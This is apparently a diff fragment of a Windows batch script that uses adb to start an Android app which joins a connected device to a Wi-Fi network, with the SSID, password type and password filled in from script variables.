+adb shell am start -n com.steinwurf.adbjoinwifi/com.steinwurf.adbjoinwifi.MainActivity -e ssid %ssid% -e password_type %past% -e password %wpass%
+
+::adb shell am start -n com.steinwurf.adbjoinwifi/com.steinwurf.adbjoinwifi.MainActivity -e ssid [SSID] -e password_type [PASSWORD_TYPE] -e password [WIFI PASSWORD]
